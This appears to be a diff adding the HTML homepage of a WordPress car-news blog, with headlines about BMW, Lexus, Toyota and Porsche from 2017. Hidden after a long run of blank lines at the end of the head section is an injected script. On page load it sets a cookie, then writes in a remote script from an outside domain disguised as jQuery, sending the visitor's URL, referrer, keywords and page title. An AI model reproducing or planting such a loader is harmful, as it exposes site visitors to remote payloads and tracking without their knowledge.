@@ -1,0 +1,1636 @@
+<!DOCTYPE html>
+<html lang="en-US" prefix="og: http://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="pingback" href="http://www.todayautosonline.com/xmlrpc.php" />
+<title>Today Auto Online</title>
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Today Auto Online &raquo; Feed" href="http://www.todayautosonline.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Today Auto Online &raquo; Comments Feed" href="http://www.todayautosonline.com/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.todayautosonline.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
+			!function(a,b,c){function d(a){var c,d,e,f,g,h=b.createElement("canvas"),i=h.getContext&&h.getContext("2d"),j=String.fromCharCode;if(!i||!i.fillText)return!1;switch(i.textBaseline="top",i.font="600 32px Arial",a){case"flag":return i.fillText(j(55356,56806,55356,56826),0,0),!(h.toDataURL().length<3e3)&&(i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,65039,8205,55356,57096),0,0),c=h.toDataURL(),i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,55356,57096),0,0),d=h.toDataURL(),c!==d);case"diversity":return i.fillText(j(55356,57221),0,0),e=i.getImageData(16,16,1,1).data,f=e[0]+","+e[1]+","+e[2]+","+e[3],i.fillText(j(55356,57221,55356,57343),0,0),e=i.getImageData(16,16,1,1).data,g=e[0]+","+e[1]+","+e[2]+","+e[3],f!==g;case"simple":return i.fillText(j(55357,56835),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode8":return i.fillText(j(55356,57135),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode9":return i.fillText(j(55358,56631),0,0),0!==i.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity","unicode9"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='http://www.todayautosonline.com/wp-content/plugins/contact-form-7/includes/css/styles.css' type='text/css' media='all' />
+<link rel='stylesheet' id='dpsp-frontend-style-css'  href='http://www.todayautosonline.com/wp-content/plugins/social-pug/assets/css/style-frontend.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tie-style-css'  href='http://www.todayautosonline.com/wp-content/themes/jarida/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='Oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald%3Aregular%2C700' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-includes/js/jquery/jquery.js'></script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-includes/js/jquery/jquery-migrate.min.js'></script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/plugins/RSSPoster_PRO/js/functions.js'></script>
+<script type='text/javascript' src='http://www.todayautosonline.com/wp-content/plugins/social-pug/assets/js/front-end.js'></script>
+<link rel='https://api.w.org/' href='http://www.todayautosonline.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.todayautosonline.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.todayautosonline.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.6.6" />
+<style type="text/css" data-source="Social Pug"></style><link rel="shortcut icon" href="http://www.todayautosonline.com/wp-content/themes/jarida/favicon.ico" title="Favicon" /><!--[if IE]>
+<script type="text/javascript">jQuery(document).ready(function (){ jQuery(".menu-item").has("ul").children("a").attr("aria-haspopup", "true");});</script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script src="http://www.todayautosonline.com/wp-content/themes/jarida/js/html5.js"></script>
+<script src="http://www.todayautosonline.com/wp-content/themes/jarida/js/selectivizr-min.js"></script>
+<![endif]-->
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" media="all" href="http://www.todayautosonline.com/wp-content/themes/jarida/css/ie8.css" />
+<![endif]-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<style type="text/css" media="screen">
+
+body{background:#ffffff;}
+.background-cover{
+	background-color:#ffffff !important;
+	}
+	#main-nav ul li.current-menu-item a,
+	#main-nav ul li.current-menu-item a:hover,
+	#main-nav ul li.current-menu-parent a,
+	#main-nav ul li.current-menu-parent a:hover,
+	#main-nav ul li.current-page-ancestor a,
+	#main-nav ul li.current-page-ancestor a:hover,
+	.pagination span.current,
+	.ei-slider-thumbs li.ei-slider-element,
+	.breaking-news span,
+	.ei-title h2,h2.cat-box-title,
+	a.more-link,.scroll-nav a,
+	.flex-direction-nav a,
+	.tagcloud a:hover,
+	#tabbed-widget ul.tabs li.active a,
+	.slider-caption h2, .full-width .content .slider-caption h2,
+	.review-percentage .review-item span span,.review-final-score,
+	.woocommerce span.onsale, .woocommerce-page span.onsale ,
+	.woocommerce .widget_price_filter .ui-slider .ui-slider-handle, .woocommerce-page .widget_price_filter .ui-slider .ui-slider-handle,
+	.button,a.button,#main-content input[type="submit"],#main-content input[type="submit"]:focus, span.onsale,
+	.mejs-container .mejs-controls .mejs-time-rail .mejs-time-current,
+	#reading-position-indicator {
+		background-color:#a10000 !important;
+	}
+	::-webkit-scrollbar-thumb{background-color:#a10000 !important;}
+	#main-nav,.top-nav {border-bottom-color: #a10000;}
+	.cat-box , .footer-bottom .container{border-top-color: #a10000;}
+#main-nav, #main-nav ul ul, #main-nav ul li.mega-menu .mega-menu-block {background-color:#000000 !important;;}
+
+
+
+</style>
+
+
+<link rel="stylesheet" href="http://www.todayautosonline.com/wp-content/plugins/wassup/css/wassup-widget.css?ver=1.9.3" type="text/css" /><meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
+<!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="http://www.todayautosonline.com/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css" media="screen"><![endif]--><!--[if IE  8]><link rel="stylesheet" type="text/css" href="http://www.todayautosonline.com/wp-content/plugins/js_composer/assets/css/vc-ie8.min.css" media="screen"><![endif]--><noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://solidstrategies.co.uk/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'I92930' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+<body id="top" class="home blog wpb-js-composer js-comp-ver-4.12 vc_responsive">
+	<div class="background-cover"></div>
+	<div class="wrapper full-site">
+				<div class="top-nav fade-in animated1 head_menu">
+			<div class="container">
+				<div class="search-block">
+					<form method="get" id="searchform" action="http://www.todayautosonline.com/">
+						<button class="search-button" type="submit" value=""></button>
+						<input type="text" id="s" name="s" value="Search..." onfocus="if (this.value == 'Search...') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Search...';}"  />
+					</form>
+				</div><!-- .search-block /-->
+						<div class="social-icons icon_flat">
+		<a class="tooldown" title="Rss" href="http://www.todayautosonline.com/feed/" target="_blank"><i class="tieicon-rss"></i></a><a class="tooldown" title="Facebook" href="https://www.facebook.com/todayautosonline" target="_blank"><i class="tieicon-facebook"></i></a><a class="tooldown" title="Twitter" href="https://twitter.com/knowledgesbank" target="_blank"><i class="tieicon-twitter"></i></a>	</div>
+
+
+				<div class="top-menu"><ul id="menu-top" class="menu"><li id="menu-item-1654" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1654"><a href="http://www.todayautosonline.com/category/auto-insurance/">Auto Insurance</a></li>
+<li id="menu-item-1655" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1655"><a href="http://www.todayautosonline.com/category/car-buying/">Car Buying</a></li>
+<li id="menu-item-1656" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1656"><a href="http://www.todayautosonline.com/category/car-loans/">Car Loans</a></li>
+<li id="menu-item-1755" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1755"><a href="http://www.todayautosonline.com/contact-us/">Contact us</a></li>
+<li id="menu-item-1756" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1756"><a href="http://www.todayautosonline.com/privacy-policy/">Privacy Policy</a></li>
+<li id="menu-item-1757" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1757"><a href="http://www.todayautosonline.com/affiliate-disclosure/">Affiliate Disclosure</a></li>
+<li id="menu-item-1758" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1758"><a href="http://www.todayautosonline.com/dmca/">DMCA</a></li>
+<li id="menu-item-1759" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1759"><a href="http://www.todayautosonline.com/terms-of-use/">Terms Of Use</a></li>
+</ul></div>				
+			</div>
+		</div><!-- .top-menu /-->
+		
+		<div class="container">
+		<header id="theme-header">
+		<div class="header-content fade-in animated1">
+			<div class="logo">
+			<h1>								<a title="Today Auto Online" href="http://www.todayautosonline.com/">
+					<img src="http://www.todayautosonline.com/wp-content/uploads/2016/10/a1.png" alt="Today Auto Online" /><strong>Today Auto Online </strong>
+				</a>
+			</h1>			</div><!-- .logo /-->
+			<div class="e3lan-top">					<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 728.90 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-2983797944499466"
+     data-ad-slot="9244858232"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>				</div>			<div class="clear"></div>
+		</div>
+									<nav id="main-nav" class="fade-in animated2">
+				<div class="container">
+				<div class="main-menu"><ul id="menu-main" class="menu"><li id="menu-item-1742" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/auto-news/">Auto News</a></li>
+<li id="menu-item-1623" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/bmw-reviews/">BMW</a></li>
+<li id="menu-item-1631" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/ferrari-reviews/">Ferrari</a></li>
+<li id="menu-item-1633" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/ford-reviews/">Ford</a></li>
+<li id="menu-item-1635" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/honda-reviews/">Honda</a></li>
+<li id="menu-item-1641" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/lamborghini-reviews/">Lamborghini</a></li>
+<li id="menu-item-1644" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/mercedes-benz-reviews/">Mercedes-Benz</a></li>
+<li id="menu-item-1646" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/nissan-reviews/">Nissan</a></li>
+<li id="menu-item-1652" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/toyota-reviews/">Toyota</a></li>
+<li id="menu-item-1653" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/volkswagen-reviews/">Volkswagen</a></li>
+<li id="menu-item-1617" class="menu-item  menu-item-type-taxonomy  menu-item-object-category  menu-item-has-children"><a href="http://www.todayautosonline.com/category/car-reviews/">Car Reviews</a>
+<ul class="sub-menu">
+	<li id="menu-item-1618" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/acura-reviews/">Acura Reviews</a></li>
+	<li id="menu-item-1619" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/alfa-romeo-reviews/">Alfa Romeo Reviews</a></li>
+	<li id="menu-item-1620" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/aston-martin-reviews/">Aston Martin Reviews</a></li>
+	<li id="menu-item-1621" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/audi-reviews/">Audi Reviews</a></li>
+	<li id="menu-item-1622" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/bentley-reviews/">Bentley Reviews</a></li>
+	<li id="menu-item-1624" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/buick-reviews/">Buick Reviews</a></li>
+	<li id="menu-item-1625" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/cadillac-reviews/">Cadillac Reviews</a></li>
+	<li id="menu-item-1626" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/chevrolet-reviews/">Chevrolet Reviews</a></li>
+	<li id="menu-item-1627" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/chrysler-reviews/">Chrysler Reviews</a></li>
+	<li id="menu-item-1628" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/daihatsu-reviews/">Daihatsu Reviews</a></li>
+	<li id="menu-item-1629" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/datsun-reviews/">Datsun Reviews</a></li>
+	<li id="menu-item-1630" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/dodge-reviews/">Dodge Reviews</a></li>
+	<li id="menu-item-1632" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/fiat-reviews/">Fiat Reviews</a></li>
+	<li id="menu-item-1634" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/gmc-reviews/">GMC Reviews</a></li>
+	<li id="menu-item-1636" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/hyundai-reviews/">Hyundai Reviews</a></li>
+	<li id="menu-item-1637" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/isuzu-reviews/">Isuzu Reviews</a></li>
+	<li id="menu-item-1638" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/jaguar-reviews/">Jaguar Reviews</a></li>
+	<li id="menu-item-1639" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/jeep-reviews/">Jeep Reviews</a></li>
+	<li id="menu-item-1640" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/kia-reviews/">Kia Reviews</a></li>
+	<li id="menu-item-1642" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/land-rover-reviews/">Land Rover Reviews</a></li>
+	<li id="menu-item-1643" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/mazda-reviews/">Mazda Reviews</a></li>
+	<li id="menu-item-1645" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/mitsubishi-reviews/">Mitsubishi Reviews</a></li>
+	<li id="menu-item-1647" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/peugeot-reviews/">Peugeot Reviews</a></li>
+	<li id="menu-item-1648" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/porsche-reviews/">Porsche Reviews</a></li>
+	<li id="menu-item-1649" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/renault-reviews/">Renault Reviews</a></li>
+	<li id="menu-item-1650" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/rolls-royce-reviews/">Rolls-Royce Reviews</a></li>
+	<li id="menu-item-1651" class="menu-item  menu-item-type-taxonomy  menu-item-object-category"><a href="http://www.todayautosonline.com/category/car-reviews/suzuki-reviews/">Suzuki Reviews</a></li>
+</ul> <!--End Sub Menu -->
+</li>
+</ul></div>				</div>
+			</nav><!-- .main-nav /-->
+		</header><!-- #header /-->
+
+	<div id="main-content" class="container fade-in animated3">
+
+<div class="content-wrap">
+<div class="content">
+
+
+		
+		<div id="flexslider" class="flexslider">
+		<ul class="slides">
+					<li>
+						
+				<a href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/">
+				<img width="610" height="330" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/778cd_P90274805_highRes-e1504878845405-610x376-610x330.jpg" class="attachment-slider size-slider wp-post-image" alt="" />				</a>
+							<div class="slider-caption">
+					<h2><a href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/">BMW’s X7 iPerformance Concept Looks Like Three Rows of Stunningly Luxurious Dog Crap</a></h2>
+					<p>BMW spent a good portion of this week ensuring the public that it is an aggressively forward-thinkin...</p>				</div>
+			</li>
+					<li>
+						
+				<a href="http://www.todayautosonline.com/stop-the-presses-bmw-car-sales-rise-sav-sales-fall-in-august/">
+				<img width="610" height="330" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/ead7e_All-new-2017-BMW-5-Series-610x330.jpg" class="attachment-slider size-slider wp-post-image" alt="" />				</a>
+							<div class="slider-caption">
+					<h2><a href="http://www.todayautosonline.com/stop-the-presses-bmw-car-sales-rise-sav-sales-fall-in-august/">Stop the Presses: BMW Car Sales Rise, SAV Sales Fall in August</a></h2>
+					<p>BMW’s North American CEO, Bernhard Kuhnt, blames inventory issues for the brand’s sharp utility vehi...</p>				</div>
+			</li>
+					<li>
+						
+				<a href="http://www.todayautosonline.com/rare-rides-the-1990-bmw-z1-a-little-bimmer-time-forgot/">
+				<img width="610" height="330" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/3429b_00f0f_lhyR1wbxjUS_1200x900-610x330.jpg" class="attachment-slider size-slider wp-post-image" alt="" />				</a>
+							<div class="slider-caption">
+					<h2><a href="http://www.todayautosonline.com/rare-rides-the-1990-bmw-z1-a-little-bimmer-time-forgot/">Rare Rides: The 1990 BMW Z1, a Little Bimmer Time Forgot</a></h2>
+					<p>Though not the first BMW-powered vehicle in our Rare Rides series, and not the first with two doors,...</p>				</div>
+			</li>
+					<li>
+						
+				<a href="http://www.todayautosonline.com/rare-rides-the-1986-vixen-is-a-turbocharged-manual-bmw-powered-motorhome/">
+				<img width="610" height="330" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/3d28f_tiki-download_file-610x330.jpg" class="attachment-slider size-slider wp-post-image" alt="" />				</a>
+							<div class="slider-caption">
+					<h2><a href="http://www.todayautosonline.com/rare-rides-the-1986-vixen-is-a-turbocharged-manual-bmw-powered-motorhome/">Rare Rides: The 1986 Vixen is a Turbocharged, Manual, BMW-powered Motorhome</a></h2>
+					<p>Our previous Rare Rides RV entry was the forgotten Mauck Special Vehicle, or MSV. With its custom fi...</p>				</div>
+			</li>
+					<li>
+						
+				<a href="http://www.todayautosonline.com/bmw-roadster-concept-suggests-next-z4-will-be-a-stunner-but-will-anybody-buy-it/">
+				<img width="610" height="330" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/ed93e_2017-BMW-Roadster-Concept-leak-Z4-610x330.jpg" class="attachment-slider size-slider wp-post-image" alt="" />				</a>
+							<div class="slider-caption">
+					<h2><a href="http://www.todayautosonline.com/bmw-roadster-concept-suggests-next-z4-will-be-a-stunner-but-will-anybody-buy-it/">BMW Roadster Concept Suggests Next Z4 Will Be a Stunner, but Will Anybody Buy It?</a></h2>
+					<p>This is not the next BMW Z4. But it’s very likely an accurate portrayal of what the production versi...</p>				</div>
+			</li>
+				</ul>
+	</div>
+	
+<script>
+jQuery(document).ready(function() {
+  jQuery('#flexslider').flexslider({
+    animation: "slide",	slideshowSpeed: 7000,
+	animationSpeed: 600,
+	randomize: false,
+	prevText: "",
+	nextText: "",
+	pauseOnHover: true
+  });
+});
+</script>
+
+			<section class="cat-box recent-box">
+			<h2 class="cat-box-title">Recent Posts</h2>
+
+			<div class="cat-box-content">
+			
+				
+													<article class="item-list recent-post1 recent-post-blog">
+
+									
+						<div class="post-thumbnail">
+							<a href="http://www.todayautosonline.com/shrinking-hybrid-premiums-2018-lexus-nx300h-gets-more-equipment-much-lower-price/" title="Permalink to Shrinking Hybrid Premiums: 2018 Lexus NX300h Gets More Equipment, Much Lower Price" rel="bookmark">
+								<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/dfc3d_2018-Lexus-NX300h-300x160.jpg" class="attachment-300x160 size-300x160" alt="" />															</a>
+						</div><!-- post-thumbnail /-->
+						
+						<h2 class="post-box-title"><a href="http://www.todayautosonline.com/shrinking-hybrid-premiums-2018-lexus-nx300h-gets-more-equipment-much-lower-price/" title="Permalink to Shrinking Hybrid Premiums: 2018 Lexus NX300h Gets More Equipment, Much Lower Price" rel="bookmark">Shrinking Hybrid Premiums: 2018 Lexus NX300h Gets More Equipment, Much Lower Price</a></h2>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 9, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/shrinking-hybrid-premiums-2018-lexus-nx300h-gets-more-equipment-much-lower-price/#respond">Leave a comment</a></span>
+</p>
+						<div class="entry">
+							<p>The Lexus NX, set for a MY2018 refresh, is one of America’s three most popular ...</p>
+							<a class="more-link" href="http://www.todayautosonline.com/shrinking-hybrid-premiums-2018-lexus-nx300h-gets-more-equipment-much-lower-price/">Read More &raquo;</a>
+						</div>
+						
+						<div class="mini-share-post">
+	<script>
+	window.___gcfg = {lang: 'en-US'};
+	(function(w, d, s) {
+	  function go(){
+		var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
+		  if (d.getElementById(id)) {return;}
+		  js = d.createElement(s); js.src = url; js.id = id;
+		  fjs.parentNode.insertBefore(js, fjs);
+		};
+		load('//connect.facebook.net/en/all.js#xfbml=1', 'fbjssdk');
+		load('https://apis.google.com/js/plusone.js', 'gplus1js');
+		load('//platform.twitter.com/widgets.js', 'tweetjs');
+	  }
+	  if (w.addEventListener) { w.addEventListener("load", go, false); }
+	  else if (w.attachEvent) { w.attachEvent("onload",go); }
+	}(window, document, 'script'));
+	</script>
+	<ul>			
+							</ul>
+	<div class="clear"></div>
+</div> <!-- .share-post -->						<div class="clear"></div>
+					</article><!-- .item-list -->
+																	<article class="item-list recent-post2 recent-post-blog">
+
+									
+						<div class="post-thumbnail">
+							<a href="http://www.todayautosonline.com/2018-toyota-camry-hybrid-first-drive-who-needs-a-prius/" title="Permalink to 2018 Toyota Camry Hybrid First Drive – Who Needs a Prius?" rel="bookmark">
+								<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/787c5_2018-Toyota-Camry-Hybrid-14-668x397-300x160.jpg" class="attachment-300x160 size-300x160" alt="" />															</a>
+						</div><!-- post-thumbnail /-->
+						
+						<h2 class="post-box-title"><a href="http://www.todayautosonline.com/2018-toyota-camry-hybrid-first-drive-who-needs-a-prius/" title="Permalink to 2018 Toyota Camry Hybrid First Drive – Who Needs a Prius?" rel="bookmark">2018 Toyota Camry Hybrid First Drive – Who Needs a Prius?</a></h2>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 9, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/2018-toyota-camry-hybrid-first-drive-who-needs-a-prius/#respond">Leave a comment</a></span>
+</p>
+						<div class="entry">
+							<p>As part of a larger group of automotive publications, TTAC has access to a variety ...</p>
+							<a class="more-link" href="http://www.todayautosonline.com/2018-toyota-camry-hybrid-first-drive-who-needs-a-prius/">Read More &raquo;</a>
+						</div>
+						
+						<div class="mini-share-post">
+	<script>
+	window.___gcfg = {lang: 'en-US'};
+	(function(w, d, s) {
+	  function go(){
+		var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
+		  if (d.getElementById(id)) {return;}
+		  js = d.createElement(s); js.src = url; js.id = id;
+		  fjs.parentNode.insertBefore(js, fjs);
+		};
+		load('//connect.facebook.net/en/all.js#xfbml=1', 'fbjssdk');
+		load('https://apis.google.com/js/plusone.js', 'gplus1js');
+		load('//platform.twitter.com/widgets.js', 'tweetjs');
+	  }
+	  if (w.addEventListener) { w.addEventListener("load", go, false); }
+	  else if (w.attachEvent) { w.attachEvent("onload",go); }
+	}(window, document, 'script'));
+	</script>
+	<ul>			
+							</ul>
+	<div class="clear"></div>
+</div> <!-- .share-post -->						<div class="clear"></div>
+					</article><!-- .item-list -->
+																	<article class="item-list recent-post3 recent-post-blog">
+
+									
+						<div class="post-thumbnail">
+							<a href="http://www.todayautosonline.com/nearly-half-of-the-vehicles-sold-by-porsche-in-august-werent-suvs/" title="Permalink to Nearly Half of the Vehicles Sold by Porsche in August Weren’t SUVs" rel="bookmark">
+								<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/074bb_2017-Porsche-911-Carrera-300x160.jpg" class="attachment-300x160 size-300x160" alt="" />															</a>
+						</div><!-- post-thumbnail /-->
+						
+						<h2 class="post-box-title"><a href="http://www.todayautosonline.com/nearly-half-of-the-vehicles-sold-by-porsche-in-august-werent-suvs/" title="Permalink to Nearly Half of the Vehicles Sold by Porsche in August Weren’t SUVs" rel="bookmark">Nearly Half of the Vehicles Sold by Porsche in August Weren’t SUVs</a></h2>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 9, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/nearly-half-of-the-vehicles-sold-by-porsche-in-august-werent-suvs/#respond">Leave a comment</a></span>
+</p>
+						<div class="entry">
+							<p>Porsche revealed a new, third-generation Cayenne on a new platform late last month, but the ...</p>
+							<a class="more-link" href="http://www.todayautosonline.com/nearly-half-of-the-vehicles-sold-by-porsche-in-august-werent-suvs/">Read More &raquo;</a>
+						</div>
+						
